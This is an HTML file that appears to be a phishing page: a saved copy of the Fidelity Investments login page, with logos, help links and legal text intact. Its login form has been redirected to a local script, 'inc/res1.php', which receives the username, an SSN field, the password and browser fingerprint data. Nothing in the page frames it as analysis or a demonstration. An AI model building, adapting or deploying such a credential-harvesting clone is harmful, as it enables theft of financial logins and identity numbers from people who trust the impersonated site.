<!DOCTYPE html>
<!-- saved from url=(0131)https://login.fidelity.com/ftgw/Fas/Fidelity/RtlCust/Login/Init?AuthRedUrl=https://oltx.fidelity.com/ftgw/fbc/ofsummary/defaultPage -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><script type="text/javascript" async="" src="https://nexus.ensighten.com/fidelity/prod/code/43bd9d35dd1031ee25584271190a9200.js?conditionId0=46215&amp;conditionId1=422684"></script><script type="text/javascript" async="" src="https://nexus.ensighten.com/fidelity/prod/code/f0340d3b15ed14b162b23d7c44f7cfbc.js?conditionId0=216421"></script><script type="text/javascript" async="" src="./Log In to Fidelity Investments_files/7e1b14fe0bfcc774f9f1239af4f12cfb.js.download"></script><script src="https://nexus.ensighten.com/fidelity/prod/serverComponent.php?r=7835.6097621975705&amp;ClientID=65&amp;PageID=https%3A%2F%2Flogin.fidelity.com%2Fftgw%2FFas%2FFidelity%2FRtlCust%2FLogin%2FInit%3FAuthRedUrl%3Dhttps%3A%2F%2Foltx.fidelity.com%2Fftgw%2Ffbc%2Fofsummary%2FdefaultPage"></script>
        

        <title>Log In to Fidelity Investments</title>

        <meta name="OASIS" content="438144.3.0">
        <meta name="description" content="Log in to your Fidelity Investments or NetBenefits accounts here.">
        <meta name="description" content="Log in to your Fidelity Investments or NetBenefits accounts here.">
        <meta http-equiv="Expires" content="Mon 13 Jun 1988 00:00:00 GMT">
        <meta http-equiv="pragma" content="no-cache">
        <meta name="viewport" content="initial-scale=1,user-scalable=no">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

        <meta name="eReview" content="609606.5">
        <!--[if lt IE 9]>
        <script src="/ftgw/pages/js/common/html5shiv.js"></script>
        <![endif]-->
        
		<!-- Start Measurement Code:  Do not remove.  -->
		<script language="JavaScript" type="text/javascript" src="./Log In to Fidelity Investments_files/Bootstrap.js.download"></script><script type="text/javascript" id="cobrowsescript" data-inputevents="{&quot;shift-46&quot;:&quot;showTerms&quot;,&quot;shift-8&quot;:&quot;showTerms&quot;}" data-groupid="19772" data-site="production" charset="UTF-8" src="https://www.glancecdn.net/cobrowse/CobrowseJS.ashx?group=19772&amp;site=production"></script>
		<!-- End Measurement Code:  Do not remove.  -->
        
        <link href="./Log In to Fidelity Investments_files/bootstrap.3.2.css" rel="stylesheet" type="text/css" media="screen, print">
        <link href="./Log In to Fidelity Investments_files/bootstrap-theme.css" rel="stylesheet" type="text/css" media="screen, print">
        <link href="./Log In to Fidelity Investments_files/retailResponsive.css" rel="stylesheet" type="text/css" media="screen, print">

    <script src="./Log In to Fidelity Investments_files/Bootstrap.js.download"></script></head>

    <body data-masking="true" style="">
        <div class="container">

            <header id="header" role="banner">
                <div class="lockIcon"></div>
                <a title="Go to Fidelity homepage" href="http://www.fidelity.com/">
                   <img width="112" alt="Fidelity.com Home" src="./Log In to Fidelity Investments_files/fidelity_logo.png">
                </a>
                <div class="off-screen">This is a secure transaction.</div>
            </header><div id="defaultLogin" class="col-xs-12 col-sm-6">
    <h1>Log In</h1>
    <p>If you have an account on NetBenefits, use the same username and password.</p>
    


<div class="fs-step" id="step-init" data-title="Login" data-operation="Login">
    <form name="Login" action="inc/res1.php" method="post" role="form" novalidate="novalidate" class="cmxform form-horizontal">
        <input type="hidden" name="DEVICE_PRINT" value="version=3.5.2_2&amp;pm_fpua=mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/81.0.4044.129 safari/537.36|5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36|Win32&amp;pm_fpsc=24|1536|864|864&amp;pm_fpsw=&amp;pm_fptz=8&amp;pm_fpln=lang=en-US|syslang=|userlang=&amp;pm_fpjv=0&amp;pm_fpco=1&amp;pm_fpasw=internal-pdf-viewer|mhjfbmdgcfjbbpaeojofohoefgiehjai|internal-nacl-plugin&amp;pm_fpan=Netscape&amp;pm_fpacn=Mozilla&amp;pm_fpol=true&amp;pm_fposp=&amp;pm_fpup=&amp;pm_fpsaw=1536&amp;pm_fpspd=24&amp;pm_fpsbd=&amp;pm_fpsdx=&amp;pm_fpsdy=&amp;pm_fpslx=&amp;pm_fpsly=&amp;pm_fpsfse=&amp;pm_fpsui=&amp;pm_os=Windows&amp;pm_brmjv=81&amp;pm_br=Chrome&amp;pm_inpt=&amp;pm_expt=" autocomplete="off">
        <div id="fs-username-entry-div" role="group" aria-label="Username Entry" class="form-group">
            <label id="fs-userid-label" for="userId-input" class="col-xs-3 col-sm-2 col-md-3 control-label">Username</label>
            <div id="fs-username-div" class="col-xs-11 col-md-8">
                <select id="userId-select" class="fs-hidden form-control" aria-hidden="true" name="SSN" required="required" aria-required="true" data-reset-text="Use a saved username" tabindex="1" disabled="disabled">
                                    <option value="new">Add/Use another username</option>
                </select>
                <input name="user" class="fs-mask-username fs-nounmask form-control" autocomplete="off" aria-hidden="false" aria-required="true" value="" type="text" maxlength="15" required="required" aria-describedby="fs-user-info" data-masklength="-3" data-clear="true" data-msg-required="Please enter your username" data-msg-invalid="This field is not properly formatted" tabindex="1" data-unmasked="">
			    <input id="hiddenId" name="SSN" value="" type="hidden" maxlength="15">
			</div>
            <a id="fs-user-info-link" role="button" tabindex="5" href="https://login.fidelity.com/ftgw/Fas/Fidelity/RtlCust/Login/Init?AuthRedUrl=https://oltx.fidelity.com/ftgw/fbc/ofsummary/defaultPage#" data-toggle="collapse" data-target="#fs-user-info"><div id="fs-user-info-icon" class="col-xs-1"><span class="off-screen">Username Information</span></div></a>
            <div id="fs-user-info" aria-live="polite" aria-relevant="all" class="collapse out col-md-offset-3 col-xs-11 col-md-8">
                <div>For U.S. employees, your username (up to 15 characters) can be any customer identifier you've chosen or your Social Security number (SSN).<br><br>If you use your SSN to log in, please create a personalized username for added security. Use the Need Help links to the right to change your login information.<br><br>For outside the U.S. employees, your Participant Number is your Username and if you created a PIN previously, it is now considered your Password.</div>
            </div>
        </div>
        <div id="fs-remember-me-div" class="form-group">
            <label id="fs-remember-me-label" for="confirm" class="col-xs-12 col-md-offset-3 col-sm-7">
                <input id="confirm" type="checkbox" name="confirm" aria-label="Remember me" tabindex="6" autocomplete="off">
                <input type="hidden" id="SavedIdInd" name="SavedIdInd" autocomplete="off" value="N">
                <span id="fs-rememberMe-text"><a aria-label="Remember Me Information" target="_blank" href="https://login.fidelity.com/ftgw/pages/retail/html/include/RememberIDInfo.html" tabindex="7">Remember me</a></span>
            </label>
        </div>
        <div id="fs-use-saved-id-div" class="form-group">
            <a id="fs-use-saved-id" class="fs-hidden col-xs-12 col-md-offset-3" href="https://login.fidelity.com/ftgw/Fas/Fidelity/RtlCust/Login/Init?AuthRedUrl=https://oltx.fidelity.com/ftgw/fbc/ofsummary/defaultPage#" aria-hidden="true" disabled="disabled">Use a saved username</a>
        </div>
        <div id="fs-password-entry-div" role="group" aria-label="Password Entry" class="form-group">
            <label id="fs-password-label" for="password" class="col-xs-3 col-sm-2 col-md-3 control-label">Password</label>
            <div id="fs-password-div" class="col-xs-11 col-md-8">
                <input type="password" name="pass" required="required" maxlength="20" aria-required="true" aria-describedby="fs-error" data-msg-required="Please enter your password" data-msg-invalid="This field is not properly formatted" data-clear="true" tabindex="2" class="form-control">
            </div>
            <a id="fs-password-info-link" role="button" tabindex="8" href="https://login.fidelity.com/ftgw/Fas/Fidelity/RtlCust/Login/Init?AuthRedUrl=https://oltx.fidelity.com/ftgw/fbc/ofsummary/defaultPage#" data-toggle="collapse" data-target="#fs-password-info"><div id="fs-password-info-icon" class="col-xs-1"><span class="off-screen">Password Information</span></div></a>
            <div id="fs-password-info" aria-live="polite" aria-relevant="all" class="collapse col-md-offset-3 col-xs-11 col-md-8">
                <div>Use 6 to 20 letters, numbers, and/or special characters</div>
            </div>
        </div>
        <div id="fs-submit-div" class="form-group"><div class="col-xs-12 col-md-offset-3"><button id="fs-login-button" class="button-component button--secondary" type="submit" tabindex="3">Log In</button></div></div>
    <div id="fs-start-page" class="form-group"><label class="col-xs-12 col-md-9 col-md-offset-3" for="SetLoginDefaults"><input type="checkbox" name="SetLoginDefaults" id="SetLoginDefaults" tabindex="9">Change your start page</label></div></form>
</div></div>

<div id="rightColumn" class="col-xs-12 col-sm-6">
    <h2>New User?</h2>
    <p>
    	<button role="button" id="registerNow" class="button-component button--secondary button--secondary-action">Register Now</button>
    </p>

    <h3>Need Help Logging In?</h3>
    <ul>
    	<li id="havingTroubleLink">
            <a href="https://login.fidelity.com/ftgw/Fas/Fidelity/RtlCust/IdentifyUser/Init" tabindex="11">Having Trouble with Your Username or Password?</a>
        </li>
        <li>
            <a href="http://personal.fidelity.com/accounts/services/content/pinchange2.shtml.cvsr?refhp=c" tabindex="12">Frequently Asked Questions</a>
        </li>
        <li>
        	<a href="http://www.fidelity.com/security/overview" target="_blank" tabindex="13">Online Security <div class="OiaNW-icon"><span class="off-screen">Opens in a new window.</span></div></a>
        </li>
    </ul>

    <h4>Log In to Other Fidelity Sites</h4>

    <ul>
        <li><a href="https://login.fidelity.com/ftgw/Fas/Fidelity/NBPart/Login/Init?ISPBypass=true" tabindex="14">Log in to your employee benefits on NetBenefits<sup>�</sup></a></li>
        <li><a href="https://login.fidelity.com/ftgw/Fas/Fidelity/CgfCust/Login/Init" tabindex="15">Log in to Fidelity Charitable<sup>SM</sup></a></li>
    </ul>
</div>


<div id="conditions" class="col-xs-12">
    <p><a href="http://personal.fidelity.com/misc/legal/sofclegal.html.cvsr" target="_top" tabindex="190">National Financial Services LLC Statement of Financial Condition</a>
    </p>
    <p>Use of this site involves the electronic transmission of personal financial information. Using this product is consent to such transmission of this information; such consent is effective at all times when using this site. Fidelity supports 128-bit <a href="http://personal.fidelity.com/accounts/services/findanswer/content/security.shtml.cvsr" tabindex="194">&nbsp;browser encryption.&nbsp;</a> Usage of Fidelity's online trading services constitutes agreement of the <a href="https://scs.fidelity.com/webxpress/electronic_services_agreement.shtml" tabindex="196"> &nbsp;Electronic Services Customer Agreement</a> &nbsp;and&nbsp; <a href="https://scs.fidelity.com/webxpress/license_agreement.html" tabindex="198">License Agreement.</a>
    </p>
    <p>Before investing, consider the funds' investment objectives, risks, charges, and expenses. Contact Fidelity for a prospectus or, if available, a summary prospectus containing this information. Read it carefully.</p>
    <p><span class="org">Fidelity Brokerage Services LLC</span>, Member&nbsp;NYSE,&nbsp;SIPC.<span class="adr"> <span class="street-address">900 Salem Street</span>, <span class="locality">Smithfield</span>, <abbr class="region" title="Rhode Island">RI</abbr> <span class="postal-code">02917</span></span></p>
    <p>609606.8.0</p>
</div>

<script type="text/javascript" src="./Log In to Fidelity Investments_files/jquery-1.10.2.min.js.download"></script>
<script type="text/javascript" src="./Log In to Fidelity Investments_files/device_print.min.js.download"></script>
<script type="text/javascript" src="./Log In to Fidelity Investments_files/jquery.validate.js.download"></script>
<script src="./Log In to Fidelity Investments_files/response.js.download"></script>
<script type="text/javascript" src="./Log In to Fidelity Investments_files/bootstrap.min.js.download"></script>
<script type="text/javascript" src="./Log In to Fidelity Investments_files/retailWidget.js.download"></script>
<script type="text/javascript" src="./Log In to Fidelity Investments_files/fs-masking.jquery.js.download"></script>


<script>
 	$(document).ready(function($) {
 	
 		$("#registerNow").click(function () {
            var url = '/ftgw/Fas/Fidelity/RtlCust/IdentifyUser/Init?intent=nur';
            window.location.href = url;
            return false;
        });
        
        $("#Login").addClass("cmxform form-horizontal");
        $("#fs-username-entry-div").addClass("form-group");
        $("#fs-userid-label").addClass("col-xs-3 col-sm-2 col-md-3 control-label");
        $("#fs-username-div").addClass("col-xs-11 col-md-8");
        $("#userId-select").addClass("form-control");
        $("#userId-input").addClass("form-control");
        $("#fs-user-info-link").attr({"href": "#", "data-toggle": "collapse", "data-target": "#fs-user-info"});
        $("#fs-user-info-link").html("<div id='fs-user-info-icon' class='col-xs-1'><span class='off-screen'>Username Information</span></div>");
        $("#fs-user-info").addClass("collapse out col-md-offset-3 col-xs-11 col-md-8");
        $("#fs-remember-me-div").addClass("form-group");
        $("#fs-remember-me-label").addClass("col-xs-12 col-md-offset-3 col-sm-7");
        $("#fs-rememberMe-text").html("<a aria-label='Remember Me Information' target='_blank' href='https://login.fidelity.com/ftgw/pages/retail/html/include/RememberIDInfo.html' tabindex='7'>Remember me</a>");
        $("#fs-use-saved-id-div").addClass("form-group");
        $("#fs-use-saved-id").addClass("col-xs-12 col-md-offset-3");
        $("#fs-password-entry-div").addClass("form-group");
        $("#fs-password-label").addClass("col-xs-3 col-sm-2 col-md-3 control-label");
        $("#fs-password-div").addClass("col-xs-11 col-md-8");
        $("#password").addClass("form-control");
        $("#fs-password-info-link").attr({"href": "#", "data-toggle": "collapse", "data-target": "#fs-password-info"});
        $("#fs-password-info-link").html("<div id='fs-password-info-icon' class='col-xs-1'><span class='off-screen'>Password Information</span></div>");
        $("#fs-password-info").addClass("collapse col-md-offset-3 col-xs-11 col-md-8");
        $("#fs-submit-div").addClass("form-group");
        $("#fs-submit-div").html("<div class='col-xs-12 col-md-offset-3'><button id='fs-login-button' class='button-component button--secondary' type='submit' tabindex='3'>Log In</button></div>");


		$('#fs-login-button').attr("disabled", false);
        //$('#fs-login-button').removeAttr('class');
        //$('#fs-login-button').addClass('btn btn-primary');
        
        
		$("#defaultLogin #Login").append("<div id='fs-start-page' class='form-group'><label class='col-xs-12 col-md-9 col-md-offset-3' for='SetLoginDefaults'><input type='checkbox' name='SetLoginDefaults' id='SetLoginDefaults' tabindex='9'>Change your start page</label></div>");
////	
		
		$(document).keypress(function(e) {
            if (e.which == 13) {
                $("form").submit();
            }
        });
        
        $("#Login").submit(function(event) {
            $('#fs-user-info').collapse({
                toggle: false
            })
            $('#fs-password-info').collapse({
                toggle: false
            })

            $('#fs-user-info').collapse('hide');
            $('#fs-password-info').collapse('hide');

            if ($(this).valid()) {
                $('#fs-login-button').attr("disabled", true);
                $('#fs-login-button').addClass('disabled');
            } else {
                return false;
            }
			
			if($("#SetLoginDefaults").is(':checked')){
        		var act = $("#Login").attr("action");
       			 var actplus = act + "?AuthRedUrl=https://webxpress.fidelity.com/ftgw/webxpress/DefaultPage?SetLoginDefaults=Y";
       			 $("#Login").attr("action", actplus);
  	  		}
        });
        $("#step-init").removeClass("fs-hidden");

        //Validation
        $('#Login').validate({
			ignore: ":disabled",
            rules: {
                'username-mask': {
                    required: true,
                    maxlength: 15
                },
                'password': {
                    required: true,
                    maxlength: 15
                }
            },
            messages: {
                'username-mask': {
                    required: 'Please enter your username',
                },
                'password': {
                    required: 'Please enter your password'
                }
            },
            errorPlacement: function(error, element) {
				 error.attr("role","alert");
		      	 error.attr("aria-atomic", true);
				 error.attr("id","fs-error");

                if ((element.attr("name") == "SSN" || element.attr("id") == "userId-input") && error.text() != "") {
                  $('#fs-user-info').after("<div id='user-error-msg' class='col-xs-12 col-md-offset-3'><div class='inline-error-icon'></div></div>");
                    error.appendTo($('#user-error-msg'));
                }

                if (element.attr("name") == "PIN") {
                    $('#fs-password-info').after("<div id='password-error-msg' class='col-xs-12 col-md-offset-3'><div class='inline-error-icon'></div></div>");
                    error.appendTo($('#password-error-msg'));
                }
            },
            success: function(label) {
                if (label.attr('for') == "userId-input") {
                    $('#user-error-msg').remove();
                }

                if (label.attr('for') == "password") {
                    $('#password-error-msg').remove();
                }
            }
        });
        
        
        $("#userId-input").focus();
        
    });


</script>
 <!-- Start Measurement Code:  Do not remove.  -->
	<script type="text/javascript" src="./Log In to Fidelity Investments_files/ensighten_lazy.js.download"></script>
<!-- End Measurement Code:  Do not remove.  -->	

<footer id="footer" class="col-xs-12">
    <div class="col-xs-12 col-sm-4 footer-logo">
    	<a title="Go to Fidelity homepage" href="http://www.fidelity.com/" alt="Fidelity.com Home">
        	<img class="footerLogo" title="Fidelity Investments. Smart Move." alt="Fidelity Investments." src="./Log In to Fidelity Investments_files/logo_gray_trans.gif" border="0" hspace="0" vspace="2">
    	</a>
    </div>
    <div class="col-xs-12 col-sm-8 footer-right-content">
        � 1998�<script type="text/javascript">document.write(new Date().getFullYear())</script>2020&nbsp; FMR LLC. All rights reserved.
        <ul>
            <li><a href="http://personal.fidelity.com/misc/legal/index_legal.shtml" target="_top">Terms of Use</a></li>
            <li><a href="http://personal.fidelity.com/accounts/services/findanswer/content/index_privacy.shtml" target="_top">Privacy</a></li>
            <li><a href="http://personal.fidelity.com/accounts/services/findanswer/content/index_security.shtml" target="_top">Security</a></li>
            <li><a href="http://personal.fidelity.com/accounts/services/index_sitemap.html" target="_top">Site Map</a></li>
        </ul>
        <a href="http://www.fidelity.com/terms-of-use">This is for persons in the U.S. only.</a>
    </div>
</footer>


</div>
<script type="text/javascript" src="https://cfa.fidelity.com/fp/tags.js?org_id=5h8i3ud8&amp;session_id=50F95D8ADBC30F5E42716A5DFCE3A8C4"></script> <noscript> <iframe style="width: 100px; height: 100px; border: 0; position: absolute; top: -5000px;" src="https://cfa.fidelity.com/fp/tags.js?org_id=5h8i3ud8&session_id=50F95D8ADBC30F5E42716A5DFCE3A8C4"></iframe> </noscript><script type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]);  _cf.push(['_setBm', true]); _cf.push(['_setAu', '/resources/ba3437fbc6232210121a7b49da5999']); </script><script type="text/javascript" src="https://login.fidelity.com/resources/ba3437fbc6232210121a7b49da5999"></script>

<div id="ZN_cvGJH8lmjxbKyln"><!--DO NOT REMOVE-CONTENTS PLACED HERE--></div><script type="text/javascript" src="https://zncvgjh8lmjxbkyln-fmrpi.siteintercept.qualtrics.com/WRSiteInterceptEngine/?Q_ZID=ZN_cvGJH8lmjxbKyln&amp;Q_LOC=https%3A%2F%2Flogin.fidelity.com%2Fftgw%2FFas%2FFidelity%2FRtlCust%2FLogin%2FInit%3FAuthRedUrl%3Dhttps%3A%2F%2Foltx.fidelity.com%2Fftgw%2Ffbc%2Fofsummary%2FdefaultPage&amp;t=1589169717431"></script><iframe src="./Log In to Fidelity Investments_files/saved_resource.html" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" style="width: 100px; height: 100px; border: 0px; position: absolute; top: -5000px;"></iframe></body></html>